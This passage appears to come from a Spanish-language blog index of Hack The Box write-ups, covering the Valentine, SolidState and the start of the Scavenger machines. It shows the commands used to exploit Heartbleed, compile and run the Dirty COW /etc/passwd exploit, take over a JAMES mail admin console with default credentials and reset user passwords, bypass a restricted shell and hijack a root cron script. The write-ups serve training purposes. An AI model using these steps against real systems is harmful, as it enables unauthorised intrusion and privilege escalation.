 0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0 . . . . . . . . . . . . . . . .  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00 . . . . . . . . . . . . 3. 2.  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00 . . . . E. D. . . . . /. . .  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00 A. . . . . . . . . . . . . . .  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01 . . . . . . . . . . . . . . . .  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00 . . I. . . . . . . . . . . 4.  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00 2. . . . . . . . . . . . . . .  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00 . . . . . . . . . . . . . . . .  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00 . . . . . . . . . . . . . . . .  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E . . . . #. . . . . . . 0. 0.  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F 1/decode. php. . Co 00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C ntent-Type: appl 0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F ication/x-www-fo 0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43 rm-urlencoded. . C 0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34 ontent-Length: 4 0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63 2. . . . $text=aGVhc 0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64 nRibGVlZGJlbGlld 0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 8E mV0aGVoeXBlCg==.  0160: EB D0 07 D2 E4 B9 3C 25 BC FE FB 22 D8 4A AC 41 . . . . . . &lt;%. . .  . J. A 0170: BC 2D 71 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C . -q. . . . . . . . . . . . . WARNING: server returned more data than it should - server is vulnerable!El exploit funciona correctamente, vemos que se filtra cadenas de información y una de ellas corresponde a un formato en base64 aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==. Si ahora tratamos de decodear la cadena, obtnemos un texto que parece corresponde a una contraseña. ❯ echo  aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==  | base64 -dheartbleedbelievethehypePodemos tratar de conectarnos por ssh ya que tenemos la contraseña, pero como no sabemos el usuario al que corresponde, haciendo un poco de guessing podemos probar con las palabras de la contraseña que obtuvimos. Probamos conectarnos como el usuario hype, sin olvidar antes dar el permiso 600 a la id_rsa. ❯ ssh -i id_rsa hype@10. 10. 10. 79Enter passphrase for key 'id_rsa': Welcome to Ubuntu 12. 04 LTS (GNU/Linux 3. 2. 0-23-generic x86_64) * Documentation: https://help. ubuntu. com/New release '14. 04. 5 LTS' available. Run 'do-release-upgrade' to upgrade to it. Last login: Fri Feb 16 14:50:29 2018 from 10. 10. 14. 3hype@Valentine:~$ whoamihypey obtenemos acceso como el usuario hype, ahora podemos visualizar la primera flag user. txt. hype@Valentine:~$ cd /homehype@Valentine:/home$ lshypehype@Valentine:/home$ cd hype/hype@Valentine:~$ cat user. txt a2d0b5e323869d9205016e1fb7a5630fELEVACION DE PRIVILEGIOS #: Para elevar privilegios como el usuario podemos hacerlo de dos formas. Primero vamos a hacer de la primera manera que es que si revisamos los archivos ocultos del directorio del usuario hype. Podemos observar que el . bash_history no es un link simbolico al /dev/null como de costumbre. ype@Valentine:~$ ls -latotal 148drwxr-xr-x 21 hype hype 4096 Aug 25 2022 . drwxr-xr-x 3 root root 4096 Dec 11 2017 . . -rw------- 1 hype hype  636 Dec 11 2017 . ICEauthority-rw------- 1 hype hype   0 Dec 11 2017 . Xauthority-rw------- 1 hype hype  131 Feb 16 2018 . bash_history-rw-r--r-- 1 hype hype  220 Dec 11 2017 . bash_logout-rw-r--r-- 1 hype hype 3486 Dec 11 2017 . bashrcdrwx------ 11 hype hype 4096 Dec 11 2017 . cachedrwx------ 9 hype hype 4096 Dec 11 2017 . configdrwx------ 3 hype hype 4096 Dec 11 2017 . dbus-rw-r--r-- 1 hype hype  26 Dec 11 2017 . dmrcdrwxr-xr-x 2 hype hype 4096 Dec 11 2017 . fontconfigdrwx------ 3 hype hype 4096 Dec 11 2017 . gconfdrwx------ 4 hype hype 4096 Dec 11 2017 . gnome2-rw-rw-r-- 1 hype hype  132 Dec 11 2017 . gtk-bookmarksdrwx------ 2 hype hype 4096 Dec 11 2017 . gvfsdrwxr-xr-x 3 hype hype 4096 Dec 11 2017 . localdrwx------ 3 hype hype 4096 Dec 11 2017 . mission-control-rw-r--r-- 1 hype hype  675 Dec 11 2017 . profiledrwx------ 2 hype hype 4096 Dec 11 2017 . pulse-rw------- 1 hype hype  256 Dec 11 2017 . pulse-cookiedrwx------ 2 hype hype 4096 Dec 13 2017 . ssh-rw-r--r-- 1 root root  39 Dec 13 2017 . tmux. conf-rw------- 1 hype hype 12173 Dec 11 2017 . xsession-errors-rw------- 1 hype hype 9659 Dec 11 2017 . xsession-errors. olddrwxr-xr-x 2 hype hype 4096 Aug 25 2022 Desktopdrwxr-xr-x 2 hype hype 4096 Dec 11 2017 Documentsdrwxr-xr-x 2 hype hype 4096 Dec 11 2017 Downloadsdrwxr-xr-x 2 hype hype 4096 Dec 11 2017 Musicdrwxr-xr-x 2 hype hype 4096 Dec 11 2017 Picturesdrwxr-xr-x 2 hype hype 4096 Dec 11 2017 Publicdrwxr-xr-x 2 hype hype 4096 Dec 11 2017 Templatesdrwxr-xr-x 2 hype hype 4096 Dec 11 2017 Videos-rw-rw-r-- 1 hype hype  33 Jun 24 15:47 user. txtSi vemos el contenido del archivo, podemos los comandos que ejecuto el usuario entre ellos, unos de tmux. hype@Valentine:~$ cat . bash_history exitexotexitls -lacd /ls -lacd . devsls -latmux -L dev_sess tmux a -t dev_sess tmux --helptmux -S /. devs/dev_sess exitEntre los comandos usados con tmux, vemos que uno de ellos hace alución a un socket file, que basicamente viene a ser una sesión en modo detached. hype@Valentine:~$ ls -l /. devs/dev_sesssrw-rw---- 1 root hype 0 Jun 24 15:47 /. devs/dev_sessComo vemos que el usuario root a abierto una sesión que a almacenado a un socket file y este tiene como grupo asignado a hype, podemos asociarnos al socket file y nos convertiriamos en root. Simplemente debemos ejecutar el comando tmux -S /. devs/dev_sess y ya estariamos como root. root@Valentine:/home/hype# whoamirootLa segunda forma de elevar privilegios seria explotar el kernel ya que si obervamos la versión que corresponde a la maquina es la 3. 2. 0 hype@Valentine:~$ uname -aLinux Valentine 3. 2. 0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/LinuxPara ello podriamos usar el dirty cow, para tratar de insertar en el /etc/passwd un usuario nuevo con privilegios que operen como root. ❯ searchsploit dirty cow----------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                    | Path----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (1)                                        | linux/dos/43199. cLinux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (2)                                        | linux/dos/44305. cLinux Kernel 2. 6. 22 &lt; 3. 9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (SUID Method)                  | linux/local/40616. cLinux Kernel 2. 6. 22 &lt; 3. 9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (/etc/passwd Method)                   | linux/local/40847. cppLinux Kernel 2. 6. 22 &lt; 3. 9 - 'Dirty COW PTRACE_POKEDATA' Race Condition (Write Access Method)                             | linux/local/40838. cLinux Kernel 2. 6. 22 &lt; 3. 9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)                  | linux/local/40839. cLinux Kernel 2. 6. 22 &lt; 3. 9 - 'Dirty COW' /proc/self/mem Race Condition (Write Access Method)                             | linux/local/40611. c----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsPapers: No ResultsPara ello vamos a traernos el exploity vamos a ejecutarlo en la maquina victima. ❯ searchsploit -m linux/local/40839. c Exploit: Linux Kernel 2. 6. 22 &lt; 3. 9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)   URL: https://www. exploit-db. com/exploits/40839   Path: /usr/share/exploitdb/exploits/linux/local/40839. cFile Type: C source, ASCII textCopied to: /home/fmiracle/Machines/Valentine/nmap/40839. cEn la maquina victima para poder ejecutarlo, si grepeamos por gcc nos indica como hacerlo. hype@Valentine:/tmp$ cat exploit. c | grep gcc//  gcc -pthread dirty. c -o dirty -lcryptEjecutamos y nos crea un compilado con el nombre de dirty. hype@Valentine:/tmp$ gcc -pthread exploit. c -o dirty -lcrypthype@Valentine:/tmp$ ls_cafenv-appconfig_ dirty exploit. c vmware-rootAl ejecutar el dirty lo que hara sera pedirnos una contraseña, la cual asignara al usuario firefart que tendra privilegios como root. hype@Valentine:/tmp$ . /dirty /etc/passwd successfully backed up to /tmp/passwd. bakPlease enter the new password: Complete line:firefart:fiWV. l3JFnVCk:0:0:pwned:/root:/bin/bashmmap: 7fbb2afd5000Si ahora revisamos el /etc/passwd, vemos que nos creo el usuario exitosamente, ahora solo tenemos que migrar a el con la contraseña que introducimos. hype@Valentine:/tmp$ cat /etc/passwdfirefart:fiWV. l3JFnVCk:0:0:pwned:/root:/bin/bash/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/bin/shman:x:6:12:man:/var/cache/man:/bin/shlp:x:7:7:lp:/var/spool/lpd:/bin/shmail:x:8:8:mail:/var/mail:/bin/shnews:x:9:9:news:/var/spool/news:/bin/shuucp:x:10:10:uucp:/var/spool/uucp:/bin/shproxy:x:13:13:proxy:/bin:/bin/shwww-data:x:33:33:www-data:/var/www:/bin/shbackup:x:34:34:backup:/var/backups:/bin/shlist:x:38:38:Mailing List Manager:/var/list:/bin/shirc:x:39:39:ircd:/var/run/ircd:/bin/shgnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/shnobody:x:65534:65534:nobody:/nonexistent:/bin/shlibuuid:x:100:101::/var/lib/libuuid:/bin/shsyslog:x:101:103::/home/syslog:/bin/falsemessagebus:x:102:105::/var/run/dbus:/bin/falsecolord:x:103:108:colord colour management daemon,,,:/var/lib/colord:/bin/falselightdm:x:104:111:Light Display Manager:/var/lib/lightdm:/bin/falsewhoopsie:x:105:114::/nonexistent:/bin/falseavahi-autoipd:x:106:117:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/falseavahi:x:107:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/falseusbmux:x:108:46:usbmux daemon,,,:/home/usbmux:/bin/falsekernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/falsepulse:x:110:119:PulseAudio daemon,,,:/var/run/pulse:/bin/falsertkit:x:111:122:RealtimeKit,,,:/proc:/bin/falsespeech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/shhplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/falsesaned:x:114:123::/home/saned:/bin/falsehype:x:1000:1000:Hemorrhage,,,:/home/hype:/bin/bashsshd:x:115:65534::/var/run/sshd:/usr/sbin/nologinAhora nos convertimos en el usuario firefart, vamos al directorio personal del usuario root y podemos visualizar la segunda flag root. txt. hype@Valentine:/tmp$ su firefartPassword: firefart@Valentine:/tmp# whoamifirefartfirefart@Valentine:/tmp# iduid=0(firefart) gid=0(root) groups=0(root)firefart@Valentine:/tmp# cd /rootfirefart@Valentine:~# cat root. txt c3261195d6711ce3bfa9bc76bfc43e4e"
    }, {
    "id": 24,
    "url": "http://localhost:4000/hackthebox/htb-writeup-SolidState",
    "title": "Maquina SolidState - htb writeup",
    "body": "2023/06/24 - Hola otra vez, el dia de hoy vamos a resolver la máquina SolidState de la plataforma de hackthebox correspondiente a una maquina linux de dificultad media, la cual vamos a explotar al conectarnos a un servicio de administración que nos permitira cambiar las contraseñas de usuarios de correo, y mediante ello obtendremos unas credenciales para conectarnos al sistema, donde una vez conectados haremos un bypass de una restricted bash asignada y finalmente nos construiremos un script en bash para detectar tareas cron y aprovecharemos una para poder convertinos en el usuario root. Vamos a comenzar creando un directorio con el nombre de la maquina: ❯ mkdir SolidState❯ ls SolidStateSeguidamente con la funcion mkt crearemos nuestros directorios de trabajo: ❯ which mktmkt () {	mkdir {nmap,content,exploits,scripts}}❯ mkt❯ ls content  exploits  nmap  scriptsENUMERACION #: Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 51PING 10. 10. 10. 51 (10. 10. 10. 51) 56(84) bytes of data. 64 bytes from 10. 10. 10. 51: icmp_seq=1 ttl=63 time=195 ms--- 10. 10. 10. 51 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 194. 687/194. 687/194. 687/0. 000 msVemos que la maquina nos responde, con un ttl de 63correspondiente a una maquina linux, ahora procederemos a el escaneo de puertos con la ayuda de nmap: Escaneo de Puertos:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre openPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 51 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-06-24 21:26 GMTInitiating SYN Stealth Scan at 21:26Scanning 10. 10. 10. 51 [65535 ports]Discovered open port 25/tcp on 10. 10. 10. 51Discovered open port 110/tcp on 10. 10. 10. 51Discovered open port 80/tcp on 10. 10. 10. 51Discovered open port 22/tcp on 10. 10. 10. 51Discovered open port 4555/tcp on 10. 10. 10. 51Discovered open port 119/tcp on 10. 10. 10. 51Completed SYN Stealth Scan at 21:26, 18. 27s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 51Host is up, received user-set (0. 21s latency). Scanned at 2023-06-24 21:26:16 GMT for 18sNot shown: 65529 closed tcp ports (reset)PORT   STATE SERVICE REASON22/tcp  open ssh   syn-ack ttl 6325/tcp  open smtp  syn-ack ttl 6380/tcp  open http  syn-ack ttl 63110/tcp open pop3  syn-ack ttl 63119/tcp open nntp  syn-ack ttl 634555/tcp open rsip  syn-ack ttl 63Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 18. 41 seconds      Raw packets sent: 86905 (3. 824MB) | Rcvd: 85777 (3. 431MB)Escaneo de Version y Servicios. : ❯ nmap -sCV -p22,25,80,110,119,4555 10. 10. 10. 51 -oN targetedStarting Nmap 7. 92 ( https://nmap. org ) at 2023-06-24 21:27 GMTNmap scan report for 10. 10. 10. 51Host is up (0. 45s latency). PORT   STATE SERVICE VERSION22/tcp  open ssh   OpenSSH 7. 4p1 Debian 10+deb9u1 (protocol 2. 0)| ssh-hostkey: |  2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)|  256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)|_ 256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)25/tcp  open smtp  JAMES smtpd 2. 3. 2|_smtp-commands: solidstate Hello nmap. scanme. org (10. 10. 16. 5 [10. 10. 16. 5])80/tcp  open http  Apache httpd 2. 4. 25 ((Debian))|_http-title: Home - Solid State Security|_http-server-header: Apache/2. 4. 25 (Debian)110/tcp open pop3  JAMES pop3d 2. 3. 2119/tcp open nntp  JAMES nntpd (posting ok)4555/tcp open rsip?| fingerprint-strings: |  GenericLines: |   JAMES Remote Administration Tool 2. 3. 2|   Please enter your login and password|   Login id:|   Password:|   Login failed for |_  Login id:1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap. org/cgi-bin/submit. cgi?new-service :SF-Port4555-TCP:V=7. 92%I=7%D=6/24%Time=64975FD6%P=x86_64-pc-linux-gnu%r(GeSF:nericLines,7C, JAMES\x20Remote\x20Administration\x20Tool\x202\. 3\. 2\nPlSF:ease\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:\nPasswoSF:rd:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n );Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 291. 45 secondsVisulizamos informacion interesante de los puertos escaneados:       Puerto   Servicio   Versión         22   SSH   OpenSSH 7. 4p1 Debian 10+deb9u1       25   SMTP   JAMES smtpd 2. 3. 2       80   HTTP   Apache httpd 2. 4. 25       110   POP3   JAMES pop3d 2. 3. 2       119   NNTP   JAMES nntpd (posting ok)       4555   RSIP?   JAMES Remote Administration Tool 2. 3. 2   EXPLOTACION #: Ya que nmap nos reporta el el puerto 4555 un servicio de administración, vamos a tratar de conectarnos. ❯ nc 10. 10. 10. 51 4555JAMES Remote Administration Tool 2. 3. 2Please enter your login and passwordLogin id:adminPassword:passwordLogin failed for adminLogin id:Obvervamos que el servicio nos pide unas credenciales, y si fallamos al tratar de conectarnos, pero podemos probar credenciales por defecto, en este caso usaremos root:root. ❯ nc 10. 10. 10. 51 4555JAMES Remote Administration Tool 2. 3. 2Please enter your login and passwordLogin id:rootPassword:rootWelcome root. HELP for a list of commandsHELPCurrently implemented commands:help                  display this helplistusers                display existing accountscountusers               display the number of existing accountsadduser [username] [password]      add a new userverify [username]            verify if specified user existdeluser [username]           delete existing usersetpassword [username] [password]    sets a user's passwordsetalias [user] [alias]         locally forwards all email for 'user' to 'alias'showalias [username]          shows a user's current email aliasunsetalias [user]            unsets an alias for 'user'setforwarding [username] [emailaddress] forwards a user's email to another email addressshowforwarding [username]        shows a user's current email forwardingunsetforwarding [username]       removes a forwarduser [repositoryname]          change to another user repositoryshutdown                kills the current JVM (convenient when James is run as a daemon)quit                  close connectionLogramos ingresar al servicio, y podemos ver que tenemos una lista de opciones que podemos usar, entre ellas una que corresponde a listar usuario y cambiarles la contraseña. Primero vamos a lista a todos los usuarios registrados. listusersExisting accounts 5user: jamesuser: thomasuser: johnuser: mindyuser: mailadminAhora como no sabemos la contraseña de cada uno de estos, usaremos la opcion para modificarles la contraseña y le asignaremos a todos el mismo nombre de usuario. setpassword james jamesPassword for james resetsetpassword thomas thomasPassword for thomas resetsetpassword john johnPassword for john resetsetpassword mindy mindyPassword for mindy resetsetpassword mailadmin mailadminPassword for mailadmin resetComo los usuarios corresponden a servicios de correo, vamos a conectarnos para inspeccionar si existe algun mail importante. ❯ telnet 10. 10. 10. 51 110Trying 10. 10. 10. 51. . . Connected to 10. 10. 10. 51. Escape character is '^]'. +OK solidstate POP3 server (JAMES POP3 Server 2. 3. 2) ready USER james+OKPASS james+OK Welcome jamesLIST+OK 0 0. Si ahora probamos a conectarnos como el usuario mindy, observamos que tiene dos correos. ❯ telnet 10. 10. 10. 51 110Trying 10. 10. 10. 51. . . Connected to 10. 10. 10. 51. Escape character is '^]'. +OK solidstate POP3 server (JAMES POP3 Server 2. 3. 2) ready USER mindy+OKPASS mindy+OK Welcome mindyLIST+OK 2 19451 11092 836. Al leer el segundo correo, encontramos unas credenciales para conectarse por ssh. RETR 2+OK Message followsReturn-Path: &lt;mailadmin@localhost&gt;Message-ID: &lt;16744123. 2. 1503422270399. JavaMail. root@solidstate&gt;MIME-Version: 1. 0Content-Type: text/plain; charset=us-asciiContent-Transfer-Encoding: 7bitDelivered-To: mindy@localhostReceived: from 192. 168. 11. 142 ([192. 168. 11. 142])     by solidstate (JAMES SMTP Server 2. 3. 2) with SMTP ID 581     for &lt;mindy@localhost&gt;;     Tue, 22 Aug 2017 13:17:28 -0400 (EDT)Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)From: mailadmin@localhostSubject: Your AccessDear Mindy,Here are your ssh credentials to access the system. Remember to reset your password after your first login. Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. username: mindypass: P@55W0rd1!2@Respectfully,JamesLas credenciales son validas, pero al conectarnos vemos que estamos limitados por una restricted bash. ❯ ssh mindy@10. 10. 10. 51The authenticity of host '10. 10. 10. 51 (10. 10. 10. 51)' can't be established. ECDSA key fingerprint is SHA256:njQxYC21MJdcSfcgKOpfTedDAXx50SYVGPCfChsGwI0. Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10. 10. 10. 51' (ECDSA) to the list of known hosts. mindy@10. 10. 10. 51's password: Linux solidstate 4. 9. 0-3-686-pae #1 SMP Debian 4. 9. 30-2+deb9u3 (2017-08-06) i686The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law. Last login: Tue Aug 22 14:00:02 2017 from 192. 168. 11. 142mindy@solidstate:~$ mindy@solidstate:~$ whoami-rbash: whoami: command not foundmindy@solidstate:~$Ahora como podemos bypasear la restricted bash, pues es muy sencillo; podemos usar como parametro -t bash y de ejecutarse un docker en la maquina nos otorgara una sesión interactiva dentro del contenedor omitiendo las restricciones. Haciendo uso de lo mencionado, podemos volver a conectarnos y visualizar la primera flag user. txt. ❯ ssh mindy@10. 10. 10. 51 -t bashmindy@10. 10. 10. 51's password: ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ whoamimindy${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ lsbin user. txt${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat user. txt 5aadb8206e94c4471346a863bf006a4aELEVACION DE PRIVILEGIOS #: Enumarando el sistema no encontramos información interesante como archivos suid o privilegios de nuestro usuario. Por ello vamos a crearnos un script en bash que nos permita ver tareas que se esten ejecutando en el sistema a intevalos regulares de tiempo al que llamaremos procmon. sh. #!/bin/bashold_process=$(ps -eo user,command)while true; do new_process=$(ps -eo user,command) diff &lt;(echo  $old_process ) &lt;(echo  $new_process ) | grep  [\&gt;\&lt;]  | grep -vE  kworker|procmon|command  old_process=$new_processdoneEjecutamos el script y despues de unos minutos vemos que el usuario root esta ejecutando un script tmp. py. ${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ . /procmon. sh &gt; root   /usr/sbin/CRON -f&lt; root   /usr/sbin/CRON -fc^C${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ ls${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ cd /dev/shm${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ nano procmon. sh${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ chmod +x procmon. sh ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ . /procmon. sh &gt; root   /usr/sbin/CRON -f&gt; root   /bin/sh -c python /opt/tmp. py&gt; root   python /opt/tmp. py&lt; root   /usr/sbin/CRON -f&lt; root   /bin/sh -c python /opt/tmp. py&lt; root   python /opt/tmp. pySi inspeccionamos los permisos del archivo, podemos ver que tenemos capacidad de escritura, quiere decir que podemos modificarlo y al cabo de unos minutos el usuario root sera el que lo ejecute. ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ls -l /opt/tmp. py -rwxrwxrwx 1 root root 105 Aug 22 2017 /opt/tmp. pyVamos a modificarlo para que al ejecutar otorgue el permiso suid a la bash. ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ cat /opt/tmp. py#!/usr/bin/env pythonimport osos. system( chmod u+s /bin/bash )Esperamos unos minutos y vemos que ahora la bash ya cuenta con el permisos suid, ahora podemos convertirnos en el usuario root , ir a su directorio personal y visualizar la segunda flag root. txt. ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ls -l /bin/bash-rwsr-xr-x 1 root root 1265272 May 15 2017 /bin/bash${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ bash -pbash-4. 4# whoamirootbash-4. 4# cd /root/bash-4. 4# cat root. txt 1a0cd964c524d89ebe2a7d630f938518"
    }, {
    "id": 25,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Scavenger",
    "title": "Maquina Scavenger - htb writeup",
    "body": "2023/06/23 - Hola de nuevo el dia de hoy vamos a resolver la máquina Scavenger de la plataforma de hackthebox correspondiente a una maquina linux de dificultad dificil, la cual explotaremos obteniendo subdomios mediante un ataque de transferencia de zona y inyecciones sql en el protocolo whois, despues ganaremos acceso simulando una tty donde encontraremos credenciales que nos serviran para hacernos de recursos por ftp y donde analizaremos un archivo pcap para descubrir un rootkit ejecutandose en la maquina y a partir de este obtener privilegios maximos que nos permita obtener la flag del usuario root. Vamos a comenzar creando un directorio con el nombre de la maquina: ❯ mkdir Scavenger❯ ls ScavengerSeguidamente con la funcion mkt crearemos nuestros directorios de trabajo: ❯ which mktmkt () {	mkdir {nmap,content,exploits,scripts}}❯ mkt❯ ls content  exploits  nmap  scriptsENUMERACION #: Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 155PING 10. 10. 10. 155 (10. 10. 10. 155) 56(84) bytes of data. 64 bytes from 10. 10. 10. 155: icmp_seq=1 ttl=63 time=123 ms--- 10. 10. 10. 155 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 123. 005/123. 005/123. 005/0. 000 msVemos que la maquina nos responde, con un ttl de 63correspondiente a una maquina linux, ahora procederemos a el escaneo de puertos con la ayuda de nmap: Escaneo de Puertos:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre openPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 155 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-06-23 22:11 GMTInitiating SYN Stealth Scan at 22:11Scanning 10. 10. 10. 155 [65535 ports]Discovered open port 22/tcp on 10. 10. 10. 155Discovered open port 21/tcp on 10. 10. 10. 155Discovered open port 80/tcp on 10. 10. 10. 155Discovered open port 53/tcp on 10. 10. 10. 155Discovered open port 43/tcp on 10. 10. 10. 155Completed SYN Stealth Scan at 22:12, 26. 69s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 155Host is up, received user-set (0. 16s latency). Scanned at 2023-06-23 22:11:41 GMT for 26sNot shown: 65496 filtered tcp ports (no-response), 32 filtered tcp ports (port-unreach), 2 closed tcp ports (reset)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT  STATE SERVICE REASON21/tcp open ftp   syn-ack ttl 6322/tcp open ssh   syn-ack ttl 6343/tcp open whois  syn-ack ttl 6353/tcp open domain syn-ack ttl 6380/tcp open http  syn-ack ttl 63Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 26. 78 seconds      Raw packets sent: 131040 (5. 766MB) | Rcvd: 39 (2. 604KB)Escaneo de Version y Servicios. : ❯ nmap -sCV -p21,22,43,53,80 10. 10. 10. 155 -oN targetedStarting Nmap 7. 92 ( https://nmap. org ) at 2023-06-23 22:12 GMTNmap scan report for 10. 10. 10. 155Host is up (0. 19s latency). PORT  STATE SERVICE VERSION21/tcp open ftp   vsftpd 3. 0. 322/tcp open ssh   OpenSSH 7. 4p1 Debian 10+deb9u4 (protocol 2. 0)| ssh-hostkey: |  2048 df:94:47:03:09:ed:8c:f7:b6:91:c5:08:b5:20:e5:bc (RSA)|  256 e3:05:c1:c5:d1:9c:3f:91:0f:c0:35:4b:44:7f:21:9e (ECDSA)|_ 256 45:92:c0:a1:d9:5d:20:d6:eb:49:db:12:a5:70:b7:31 (ED25519)43/tcp open whois?| fingerprint-strings: |  GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest: |   % SUPERSECHOSTING WHOIS server v0. 6beta@MariaDB10. 1. 37|   more information on SUPERSECHOSTING, visit http://www. supersechosting. htb|   This query returned 0 object|  SSLSessionReq, TLSSessionReq, TerminalServerCookie: |   % SUPERSECHOSTING WHOIS server v0. 6beta@MariaDB10. 1. 37|   more information on SUPERSECHOSTING, visit http://www. supersechosting. htb|_  1267 (HY000): Illegal mix of collations (utf8mb4_general_ci,IMPLICIT) and (utf8_general_ci,COERCIBLE) for operation 'like'53/tcp open domain ISC BIND 9. 10. 3-P4 (Debian Linux)| dns-nsid: |_ bind. version: 9. 